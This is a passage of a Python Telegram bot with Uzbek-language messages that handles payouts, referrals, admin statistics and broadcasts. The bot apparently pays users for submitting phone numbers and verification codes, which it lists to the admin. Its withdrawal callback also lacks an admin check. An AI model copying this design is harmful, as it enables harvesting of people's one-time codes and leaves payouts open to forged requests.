        await message.answer(
            "❌ Noto'g'ri ma'lumot!\n"
            "Karta raqami (16 xonali) yoki telefon raqami kiriting:"
        )
        return
    
    try:
        user = get_user(telegram_id)
        
        if not user:
            await message.answer("❌ Foydalanuvchi topilmadi!", reply_markup=get_user_menu())
            withdraw_states.pop(telegram_id, None)
            return
        
        balance = user[3]
        
        if balance < Config.MIN_WITHDRAW:
            await message.answer("❌ Balans yetarli emas!", reply_markup=get_user_menu())
            withdraw_states.pop(telegram_id, None)
            return
        
        if balance > Config.MAX_WITHDRAW:
            await message.answer(
                f"❌ Maksimal yechish: {Config.MAX_WITHDRAW:,} so'm\n"
                f"Sizning balans: {balance:,} so'm\n"
                f"Admin bilan bog'laning.",
                reply_markup=get_user_menu()
            )
            withdraw_states.pop(telegram_id, None)
            return
        
        execute_query(
            "INSERT INTO withdraws (telegram_id, phone, amount, status) VALUES (%s, %s, %s, 'pending')",
            (telegram_id, info, balance)
        )
        
        execute_query(
            "UPDATE users SET balance = 0, updated_at = CURRENT_TIMESTAMP WHERE telegram_id = %s",
            (telegram_id,)
        )
        
        add_transaction(telegram_id, balance, 'withdraw', 'Pul yechish')
        
        await message.answer(
            f"✅ So'rov qabul qilindi!\n"
            f"💰 Summa: {balance:,} so'm\n"
            f"📱 Ma'lumot: {info}\n"
            f"📊 Turi: {'Karta' if info_type == 'card' else 'Telefon'}",
            reply_markup=get_user_menu()
        )
        
        try:
            user_info = await bot.get_chat(telegram_id)
            user_name = user_info.full_name
            user_username = user_info.username or "yo'q"
            
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [
                    InlineKeyboardButton(text="✅ To'landi", callback_data=f"wdone_{telegram_id}_{balance}"),
                    InlineKeyboardButton(text="❌ Rad etish", callback_data=f"wreject_{telegram_id}")
                ]
            ])
            
            await bot.send_message(
                Config.ADMIN_ID,
                f"💸 <b>YECHISH SO'ROVI</b>\n\n"
                f"👤 <b>Foydalanuvchi:</b> {user_name}\n"
                f"🔗 <b>Profil:</b> @{user_username}\n"
                f"🆔 <b>ID:</b> <code>{telegram_id}</code>\n"
                f"📱 <b>Karta/Nomer:</b> <code>{info}</code>\n"
                f"📊 <b>Turi:</b> {'Karta' if info_type == 'card' else 'Telefon'}\n"
                f"💰 <b>Summa:</b> <code>{balance:,} so'm</code>\n"
                f"👥 <b>Referallar:</b> {get_referral_count(telegram_id)} ta",
                reply_markup=keyboard
            )
        except Exception as e:
            logger.error(f"❌ Admin'ga yuborishda xatolik: {e}")
        
        withdraw_states.pop(telegram_id, None)
    except Exception as e:
        logger.error(f"❌ Yechish ma'lumot xatosi: {e}")
        await message.answer("❌ Xatolik yuz berdi!")

# ================= 10. ADMIN YECHISH =================
@dp.callback_query(lambda c: c.data.startswith(("wdone_", "wreject_")))
async def admin_withdraw_action(callback: types.CallbackQuery):
    data = callback.data.split("_")
    action = data[0]
    
    if action == "wdone":
        telegram_id = int(data[1])
        amount = int(data[2])
        
        try:
            withdraw = execute_query(
                "SELECT * FROM withdraws WHERE telegram_id = %s AND status = 'pending' ORDER BY id DESC LIMIT 1",
                (telegram_id,),
                fetch_one=True
            )
            
            if not withdraw:
                await callback.answer("❌ So'rov topilmadi!", show_alert=True)
                return
            
            execute_query(
                "UPDATE withdraws SET status = 'completed', processed_at = CURRENT_TIMESTAMP WHERE id = %s",
                (withdraw[0],)
            )
            
            try:
                await bot.send_message(
                    telegram_id,
                    f"✅ To'lov amalga oshirildi!\n"
                    f"💰 Summa: {withdraw[3]:,} so'm\n"
                    f"📱 Ma'lumot: {withdraw[2]}",
                    reply_markup=get_user_menu()
                )
            except Exception as e:
                logger.error(f"❌ Xabar yuborishda xatolik: {e}")
            
            await callback.message.edit_text(
                f"✅ <b>TO'LANDI!</b>\n\n"
                f"👤 ID: {telegram_id}\n"
                f"💰 Summa: {withdraw[3]:,} so'm\n"
                f"📱 Ma'lumot: {withdraw[2]}"
            )
            await callback.answer("✅ To'landi!")
            
        except Exception as e:
            logger.error(f"❌ Xatolik: {e}")
            await callback.answer("❌ Xatolik!", show_alert=True)
    
    elif action == "wreject":
        telegram_id = int(data[1])
        
        try:
            withdraw = execute_query(
                "SELECT * FROM withdraws WHERE telegram_id = %s AND status = 'pending' ORDER BY id DESC LIMIT 1",
                (telegram_id,),
                fetch_one=True
            )
            
            if not withdraw:
                await callback.answer("❌ So'rov topilmadi!", show_alert=True)
                return
            
            execute_query(
                "UPDATE withdraws SET status = 'rejected', processed_at = CURRENT_TIMESTAMP WHERE id = %s",
                (withdraw[0],)
            )
            
            execute_query(
                "UPDATE users SET balance = balance + %s, updated_at = CURRENT_TIMESTAMP WHERE telegram_id = %s",
                (withdraw[3], telegram_id)
            )
            
            add_transaction(telegram_id, withdraw[3], 'refund', 'Yechish rad etildi')
            
            try:
                await bot.send_message(
                    telegram_id,
                    "❌ So'rov rad etildi!\n"
                    f"💰 {withdraw[3]:,} so'm balansga qaytarildi.",
                    reply_markup=get_user_menu()
                )
            except:
                pass
            
            await callback.message.edit_text(
                f"❌ <b>RAD ETILDI!</b>\n\n"
                f"👤 ID: {telegram_id}\n"
                f"💰 Summa: {withdraw[3]:,} so'm"
            )
            await callback.answer("❌ Rad etildi!")
            
        except Exception as e:
            logger.error(f"❌ Xatolik: {e}")
            await callback.answer("❌ Xatolik!", show_alert=True)

# ================= 11. ADMIN STATISTIKA =================
@dp.message(F.text == "📊 Statistika")
async def admin_stats(message: types.Message):
    if message.from_user.id != Config.ADMIN_ID:
        return
    
    try:
        total_users = execute_query("SELECT COUNT(*) FROM users", fetch_one=True)[0]
        registered_users = execute_query("SELECT COUNT(*) FROM users WHERE phone != 'no_phone_yet'", fetch_one=True)[0]
        unregistered_users = execute_query("SELECT COUNT(*) FROM users WHERE phone = 'no_phone_yet'", fetch_one=True)[0]
        blocked_users = execute_query("SELECT COUNT(*) FROM users WHERE is_blocked = TRUE", fetch_one=True)[0]
        pending = execute_query("SELECT COUNT(*) FROM codes WHERE status = 'pending' OR status = 'pending_verify'", fetch_one=True)[0]
        verified = execute_query("SELECT COUNT(*) FROM codes WHERE status = 'verified'", fetch_one=True)[0]
        rejected = execute_query("SELECT COUNT(*) FROM codes WHERE status = 'rejected'", fetch_one=True)[0]
        verified_phones = execute_query("SELECT COUNT(*) FROM verified_phones", fetch_one=True)[0]
        total_balance = execute_query("SELECT COALESCE(SUM(balance), 0) FROM users", fetch_one=True)[0]
        pending_withdraws = execute_query("SELECT COUNT(*) FROM withdraws WHERE status = 'pending'", fetch_one=True)[0]
        completed_withdraws = execute_query("SELECT COUNT(*) FROM withdraws WHERE status = 'completed'", fetch_one=True)[0]
        total_withdrawn = execute_query("SELECT COALESCE(SUM(amount), 0) FROM withdraws WHERE status = 'completed'", fetch_one=True)[0]
        total_referrals = execute_query("SELECT COUNT(*) FROM referrals", fetch_one=True)[0]
        today_users = execute_query("SELECT COUNT(*) FROM users WHERE created_at::date = CURRENT_DATE", fetch_one=True)[0]
        today_verified = execute_query("SELECT COUNT(*) FROM codes WHERE created_at::date = CURRENT_DATE AND status = 'verified'", fetch_one=True)[0]
        
        await message.answer(
            f"📊 <b>STATISTIKA</b>\n\n"
            f"👥 <b>Foydalanuvchilar:</b>\n"
            f"  • Jami: {total_users}\n"
            f"  • Ro'yxatdan o'tgan: {registered_users}\n"
            f"  • Telefon kiritmagan: {unregistered_users}\n"
            f"  • Bloklangan: {blocked_users}\n"
            f"  • Bugun qo'shilgan: {today_users}\n\n"
            f"📱 <b>Raqamlar:</b>\n"
            f"  • Tasdiqlangan: {verified_phones}\n"
            f"  • Bugun tasdiqlangan: {today_verified}\n\n"
            f"🔑 <b>Kodlar:</b>\n"
            f"  • Kutayotgan: {pending}\n"
            f"  • Tasdiqlangan: {verified}\n"
            f"  • Rad etilgan: {rejected}\n\n"
            f"💰 <b>Moliyaviy:</b>\n"
            f"  • Jami balans: {total_balance:,} so'm\n"
            f"  • Yechilgan: {total_withdrawn:,} so'm\n"
            f"  • Kutayotgan yechish: {pending_withdraws} ta\n"
            f"  • Yakunlangan yechish: {completed_withdraws} ta\n\n"
            f"👥 <b>Referallar:</b> {total_referrals} ta"
        )
    except Exception as e:
        logger.error(f"❌ Statistika xatosi: {e}")
        await message.answer("❌ Xatolik yuz berdi!")

# ================= 12. KUTAYOTGAN KODLAR =================
@dp.message(F.text == "📋 Kutayotgan kodlar")
async def pending_codes(message: types.Message):
    if message.from_user.id != Config.ADMIN_ID:
        return
    
    try:
        codes = execute_query(
            "SELECT * FROM codes WHERE status = 'pending_verify' AND expires_at > NOW() ORDER BY id DESC LIMIT 20",
            fetch_all=True
        )
        
        if codes:
            text = "📋 <b>KUTAYOTGAN KODLAR:</b>\n\n"
            for c in codes:
                text += f"👤 ID: <code>{c[3]}</code>\n"
                text += f"📞 Tel: <code>{c[1]}</code>\n"
                text += f"🔑 Kod: <code>{c[2]}</code>\n"
                text += f"⏳ Yaratilgan: {c[5].strftime('%H:%M:%S')}\n"
                text += f"⏰ Tugaydi: {c[6].strftime('%H:%M:%S')}\n"
                text += "➖➖➖➖➖➖➖\n"
            await message.answer(text)
        else:
            await message.answer("📭 Kutayotgan kodlar yo'q")
    except Exception as e:
        logger.error(f"❌ Xatolik: {e}")
        await message.answer("❌ Xatolik yuz berdi!")

# ================= 13. YECHISH SO'ROVLARI =================
@dp.message(F.text == "💸 Yechish so'rovlari")
async def pending_withdraws(message: types.Message):
    if message.from_user.id != Config.ADMIN_ID:
        return
    
    try:
        withdraws = execute_query(
            "SELECT * FROM withdraws WHERE status = 'pending' ORDER BY id DESC LIMIT 20",
            fetch_all=True
        )
        
        if withdraws:
            text = "💸 <b>YECHISH SO'ROVLARI:</b>\n\n"
            for w in withdraws:
                text += f"👤 ID: <code>{w[1]}</code>\n"
                text += f"📱 Ma'lumot: <code>{w[2]}</code>\n"
                text += f"💰 Summa: <code>{w[3]:,} so'm</code>\n"
                text += f"📅 Vaqt: {w[5].strftime('%Y-%m-%d %H:%M')}\n"
                text += "➖➖➖➖➖➖➖\n"
            await message.answer(text)
        else:
            await message.answer("📭 Yechish so'rovlari yo'q")
    except Exception as e:
        logger.error(f"❌ Xatolik: {e}")
        await message.answer("❌ Xatolik yuz berdi!")

# ================= 14. TASDIQLANGAN RAQAMLAR =================
@dp.message(F.text == "✅ Tasdiqlangan raqamlar")
async def verified_phones_list(message: types.Message):
    if message.from_user.id != Config.ADMIN_ID:
        return
    
    try:
        phones = execute_query(
            "SELECT * FROM verified_phones ORDER BY id DESC LIMIT 50",
            fetch_all=True
        )
        
        if phones:
            text = "✅ <b>TASDIQLANGAN RAQAMLAR:</b>\n\n"
            for p in phones:
                text += f"📞 {p[1]}\n"
                text += f"👤 ID: {p[2]}\n"
                text += f"📅 Vaqt: {p[3].strftime('%Y-%m-%d %H:%M')}\n"
                text += "➖➖➖➖➖➖➖\n"
            await message.answer(text)
        else:
            await message.answer("📭 Tasdiqlangan raqamlar yo'q")
    except Exception as e:
        logger.error(f"❌ Xatolik: {e}")
        await message.answer("❌ Xatolik yuz berdi!")

# ================= 15. BARCHAGA XABAR =================
@dp.message(F.text == "📨 Barchaga xabar")
async def broadcast_start(message: types.Message):
    if message.from_user.id != Config.ADMIN_ID:
        return
    
    admin_states[Config.ADMIN_ID] = "waiting_message"
    await message.answer(
        "📨 Xabar matnini yozing:\n"
        "❌ Bekor qilish uchun 'Bekor' deb yozing."
    )

@dp.message(lambda message: message.from_user.id == Config.ADMIN_ID and admin_states.get(Config.ADMIN_ID) == "waiting_message")
async def broadcast_send(message: types.Message):
    text = message.text
    
    if text.lower() == "bekor":
        admin_states.pop(Config.ADMIN_ID, None)
        await message.answer("✅ Bekor qilindi", reply_markup=get_admin_menu())
        return
    
    admin_states.pop(Config.ADMIN_ID, None)
    
    try:
        users = execute_query(
            "SELECT telegram_id FROM users WHERE is_blocked = FALSE",
            fetch_all=True
        )
        
        sent = 0
        failed = 0
        
        status_msg = await message.answer(f"📨 Yuborilmoqda... 0/{len(users)}")
        
        for i, user in enumerate(users, 1):
            try:
                await bot.send_message(user[0], f"📨 <b>XABAR</b>\n\n{text}")
                sent += 1
            except Exception as e:
                failed += 1
                logger.error(f"❌ Xabar yuborishda xatolik ({user[0]}): {e}")
            
            if i % 10 == 0:
                try:
                    await status_msg.edit_text(f"📨 Yuborilmoqda... {i}/{len(users)}")
                except:
                    pass
            
            await asyncio.sleep(0.05)
        
        await status_msg.edit_text(
            f"✅ Yuborildi: {sent} ta\n"
            f"❌ Xatolik: {failed} ta\n"
            f"📊 Jami: {len(users)} ta",
            reply_markup=get_admin_menu()
        )
    except Exception as e:
        logger.error(f"❌ Broadcast xatosi: {e}")
        await message.answer("❌ Xatolik yuz berdi!")

# ================= 16. FOYDALANUVCHILAR RO'YXATI =================
@dp.message(F.text == "👥 Foydalanuvchilar")
async def users_list(message: types.Message):
    if message.from_user.id != Config.ADMIN_ID:
        return
    
    try:
        users = execute_query(
            "SELECT telegram_id, phone, balance, is_blocked, created_at FROM users ORDER BY id DESC LIMIT 30",
            fetch_all=True
        )
        
        if users:
            text = "👥 <b>FOYDALANUVCHILAR:</b>\n\n"
            for u in users:
                status = "❌ Bloklangan" if u[3] else "✅ Faol"
                text += f"🆔 ID: <code>{u[0]}</code>\n"
                text += f"📞 Tel: {u[1]}\n"
                text += f"💰 Balans: {u[2]:,} so'm\n"
                text += f"📊 Holat: {status}\n"
                text += f"📅 Ro'yxatdan o'tgan: {u[4].strftime('%Y-%m-%d')}\n"
                text += "➖➖➖➖➖➖➖\n"
            await message.answer(text)
        else:
            await message.answer("📭 Foydalanuvchilar yo'q")
    except Exception as e:
        logger.error(f"❌ Xatolik: {e}")
        await message.answer("❌ Xatolik yuz berdi!")

# ================= 17. BALANS KOMANDASI =================
@dp.message(Command("balance"))
@rate_limit()
async def check_balance(message: types.Message):
    if message.from_user.id == Config.ADMIN_ID:
        return
    
    try:
        user = get_user(message.from_user.id)
        
        if not user:
            await message.answer("❌ Ro'yxatdan o'tmagansiz. /start")
            return
        
        if user[2] == "no_phone_yet":
            await message.answer(
                "❌ Siz hali ro'yxatdan o'tmagansiz!\n\n"
                "🗳️ Ovoz berish tugmasini bosing va telefon raqamingizni yuboring.",
                reply_markup=get_user_menu()
            )
            return
        
        await message.answer(f"💰 Balans: {user[3]:,} so'm", reply_markup=get_user_menu())
    except Exception as e:
        logger.error(f"❌ Balans xatosi: {e}")
        await message.answer("❌ Xatolik yuz berdi!")

# ================= 18. ADMIN MENU =================
@dp.message(Command("admin"))
async def admin_panel(message: types.Message):
    if message.from_user.id == Config.ADMIN_ID:
        await message.answer("👋 Admin panel", reply_markup=get_admin_menu())

# ================= 19. REFERALLAR =================
@dp.message(F.text == "👥 Referallar")
@rate_limit()
async def show_referrals(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == Config.ADMIN_ID:
        await message.answer("👋 Siz adminsiz")
        return
    
    try:
        user = get_user(telegram_id)
        
        if not user:
            await message.answer("❌ Ro'yxatdan o'tmagansiz. /start bosing")
            return
        
        ref_count = get_referral_count(telegram_id)
        bot_info = await bot.get_me()
        ref_link = f"https://t.me/{bot_info.username}?start=ref_{telegram_id}"
        
        await message.answer(
            f"👥 <b>REFERRAL TIZIMI</b>\n\n"
            f"🔗 <b>Sizning referal link:</b>\n"
            f"<code>{ref_link}</code>\n\n"
            f"👤 <b>Referallar soni:</b> {ref_count}\n"
            f"🎯 <b>Yechish uchun kerak:</b> {Config.MIN_REFERRALS} ta\n\n"
            f"📤 Linkni do'stlaringizga yuboring!\n"
            f"{Config.MIN_REFERRALS} ta do'stingiz start bossa, pul yechib olasiz"
        )
    except Exception as e:
        logger.error(f"❌ Referallar xatosi: {e}")
        await message.answer("❌ Xatolik yuz berdi!")

# ================= 20. TRANZAKSIYALAR TARIXI =================
@dp.message(F.text == "📜 Tarix")
@rate_limit()
async def show_history(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == Config.ADMIN_ID:
        await message.answer("👋 Siz adminsiz")
        return
    
    try:
        transactions = execute_query(
            "SELECT * FROM transactions WHERE telegram_id = %s ORDER BY id DESC LIMIT 10",
            (telegram_id,),
            fetch_all=True
        )
        
        if transactions:
            text = "📜 <b>TRANZAKSIYALAR TARIXI:</b>\n\n"
            for trans in transactions:
                sign = "+" if trans[3] == 'deposit' else "-"
                emoji = "✅" if trans[3] == 'deposit' else "❌"
                text += f"{emoji} {sign}{trans[2]:,} so'm\n"
                text += f"📝 {trans[4] or 'Tranzaksiya'}\n"
                text += f"📅 {trans[5].strftime('%Y-%m-%d %H:%M')}\n"
                text += "➖➖➖➖➖➖➖\n"
            await message.answer(text)
        else:
            await message.answer("📭 Tranzaksiyalar yo'q")
    except Exception as e:
        logger.error(f"❌ Tarix xatosi: {e}")
        await message.answer("❌ Xatolik yuz berdi!")

# ================= TOZALASH VAZIFALARI =================
async def cleanup_expired_codes():
    """Eskirgan kodlarni tozalash"""
    while True:
        try:
            execute_query(
                "UPDATE codes SET status = 'expired' WHERE status IN ('pending', 'pending_verify') AND expires_at < NOW()"
            )
            logger.info("✅ Eskirgan kodlar tozalandi")
        except Exception as e:
            logger.error(f"❌ Tozalash xatosi: {e}")
        await asyncio.sleep(60)

async def check_expired_withdraws():
    """Eskirgan yechish so'rovlarini tekshirish"""
    while True:
        try:
            expired_withdraws = execute_query(
                "SELECT * FROM withdraws WHERE status = 'pending' AND created_at < NOW() - INTERVAL '24 hours'",
                fetch_all=True
            )
            
            for withdraw in expired_withdraws:
                execute_query(
                    "UPDATE withdraws SET status = 'rejected', processed_at = CURRENT_TIMESTAMP WHERE id = %s",
                    (withdraw[0],)
                )
                
                execute_query(
                    "UPDATE users SET balance = balance + %s WHERE telegram_id = %s",
                    (withdraw[3], withdraw[1])
                )
                
                try:
                    await bot.send_message(
                        withdraw[1],
                        f"❌ Yechish so'rovingiz avtomatik rad etildi!\n"
                        f"💰 {withdraw[3]:,} so'm balansga qaytarildi.\n"
                        f"📝 Sabab: 24 soat ichida admin tomonidan tasdiqlanmadi.",
                        reply_markup=get_user_menu()
                    )
                except:
                    pass
        except Exception as e:
            logger.error(f"❌ Yechish tekshirish xatosi: {e}")
        await asyncio.sleep(300)

# ================= MAIN =================
async def main():
    logger.info("🤖 Bot ishga tushmoqda...")
    
    try:
        init_db_pool()
        init_db()
    except Exception as e:
        logger.error(f"❌ Database init xatosi: {e}")
        return
    
    asyncio.create_task(cleanup_expired_codes())
    asyncio.create_task(check_expired_withdraws())
    
    logger.info("✅ Bot tayyor!")
    
    try:
        await dp.start_polling(bot)
    except Exception as e:
        logger.error(f"❌ Bot xatosi: {e}")
    finally:
        await bot.session.close()
        if db_pool:
            db_pool.closeall()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("👋 Bot to'xtatildi")
    except Exception as e:
        logger.error(f"❌ Kutilmagan xatolik: {e}")
